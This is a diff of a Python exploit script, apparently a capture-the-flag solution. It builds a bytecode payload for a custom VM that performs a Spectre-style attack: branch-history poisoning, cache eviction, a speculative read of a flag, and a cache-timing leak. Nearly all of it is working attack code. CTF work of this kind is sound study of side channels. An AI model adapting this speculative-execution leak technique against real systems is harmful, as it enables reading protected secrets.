@@ -177,40 +177,44 @@ def loop (reg, c, _code):
   print_disasm (gadget)
   ac = "\x0c" + chr(reg) + p32(c) + p32 (code)
   return ac
-  """
+
+"""
 // static value
 int flush_size = 64;
 
+
+// make our test area have dirty bit
+void * temp = 0x0;
+for (int j = 0; j < 0x100000/flush_size; j++)
+data[temp + j] = 0xffffffff;
+
 // branch history (pAp) poisoning 
-for (int i = 0; i < 50; i++)
-builtin_bc (random() % 0x1000);
+builtin_bc (0x1000 - 4); // jbe instruction will not jump
+// repeat 50 times
 
-// flush
-void * temp = 0x200010;
-for (int j = 0; j < 0x1cff; j++)
-*(unsigned int)(temp + flush_size * j) = 0;
-
-for (int i = 0; i < 5; i++)
+// flush by reverse order
+for (int i = 0; i < 10; i++) 
 {
-  void * temp = 0x200010;
-  for (int j = 0; j < 0x1cff; j++)
-    r8 = *(temp + flush_size * j);
-  void * temp = 0x100010;
-  for (int j = 0; j < 0x1cff; j++)
-    r8 = *(temp + flush_size * j);
+  void * temp = 0x2000000;
+  for (int j = 0; j < 0x1f00000 / flush_size; j++)
+    r8 = data[temp - j];
 }
 
 // delay fence
 for (int i = 0; i < 0x100; i++);
+
 // branch history (global) poisoning
 for (int i = 0; i < -1 ; i++); /* jle instruction will not jump */
 // repeat 256 times
 
-builtin_time (); // push flag into cache
+builtin_time (); // access flag into cache
 
 // go to branch speculation
+/* use (idx * 0x1000) as array index; */
 r15 = 56, r12 = 56-offset;
-r8 = arr[(builtin_bc(0x1018) << r15) >> r12];
+r8 = data[(builtin_bc(0x1018) << r15) >> r12];
+
+// cache timing attack 
 """
 
 pay = ""
@@ -224,6 +228,7 @@ jmp_target1 = len(pay)
 
 pay += movc (0, 0xffffffff) 
 pay += store (DST['r10'])
+#pay += load (SRC['r10'])
 pay += movc (0, 4)
 pay += add (DST['r10'])
 pay += loop (SRC['r10'], 0x100000 , jmp_target1) # cmp r11, iter_max
@@ -238,34 +243,16 @@ pay2 += movc (0, 0x1000-4)
 pay2 += builtin (0) # return to r8
 pay += pay2*50
 
-
-
 # cache eviction
 pay += movc (DST['r13'], 0x0)
 jmp_target4 = len(pay)
 
 #loop start
 pay += movc (DST['r11'], 0)
-pay += movc (DST['r10'], 0x100000)
+pay += movc (DST['r10'], 0x00000)
 jmp_target1 = len(pay)
 
-pay += movc (DST['r12'], 0x2100000 - 10 )
-pay += movc (0, 0x0) 
-pay += sub (DST['r12'] | SRC['r10'])
-pay += load (SRC['r12'])
-pay += movc (0, flush_size)
-pay += add (DST['r10'])
-pay += movc (DST['r8'], 1)
-pay += add (DST['r11'])
-pay += loop (SRC['r11'], 0x1f00000 / flush_size - 1, jmp_target1) # cmp r11, iter_max
-#loop end
-
-#loop start
-pay += movc (DST['r11'], 0)
-pay += movc (DST['r10'], 0x100010)
-jmp_target1 = len(pay)
-
-pay += movc (DST['r12'], 0x2100000)
+pay += movc (DST['r12'], 0x2000000 - 10 )
 pay += movc (0, 0x0) 
 pay += sub (DST['r12'] | SRC['r10'])
 pay += load (SRC['r12'])
@@ -278,16 +265,14 @@ pay += loop (SRC['r11'], 0x1f00000 / flush_size - 1, jmp_target1) # cmp r11, ite
 
 pay += movc(DST['r8'], 1)
 pay += add (DST['r13'] | SRC['r8'])
-pay += loop (SRC['r13'], 0x10, jmp_target4) # cmp r12, iter_max
-
-#delay fence
-pay += movc(DST['r8'], 1)
-pay += add (DST['r13'])
-pay += loop (SRC['r13'], 0x100, jmp_target4) # cmp r10, iter_max
+pay += loop (SRC['r13'], 0x100, jmp_target4) # cmp r13, iter_max
 
 # branch history poisoning (global)
 # jle -> not taken
 pay += loop (SRC['r8'],0xffffffff, jmp_target1) *256
+
+
+pay += builtin (8) #exploit works w/o this line
 
 # access to flag 
 FLAG_OFFSET = 0
@@ -303,7 +288,8 @@ pay += load (SRC['r14'] | DST['r8']) #  r8 = data[r14]
 
 # check
 pay += movc (3, 0)
-pay += movc (DST['r10'], 0x100000)
+#pay += movc (DST['r10'], 0x100000)
+pay += movc (DST['r10'], 0x0)
 
 jmp_targetF = len(pay)
 pay += movc (0, 0x0) 
@@ -313,15 +299,22 @@ pay += builtin (8) # return to r8
 pay += sub (DST['r8'] | SRC['r9'])
 pay += movc(DST['r9'],3)
 pay += shl(DST['r11'] | SRC['r9'])
-pay += movc (DST['r12'], 0x800)
-pay += sub (DST['r12'] | SRC['r11'])
+
+#pay += movc (DST['r12'], 0x800)
+pay += movc (DST['r12'], 0x0)
+#pay += sub (DST['r12'] | SRC['r11'])
+pay += add (DST['r12'] | SRC['r11'])
+
 pay += load (DST['r9'] | SRC['r12'])
 pay += andd (DST['r8'] | SRC['r9'])
 pay += store (DST['r12'] | SRC['r8'])
 pay += movc(DST['r9'],3)
 pay += shr(DST['r11'] | SRC['r9'])
 pay += movc (0, 1 << offset) 
-pay += sub (DST['r10'])
+
+#pay += sub (DST['r10'])
+pay += add (DST['r10'])
+
 pay += movc (0, 1)
 pay += add (DST['r11'])
 pay += loop (SRC['r11'], 0x100, jmp_targetF) # cmp r11, iter_max
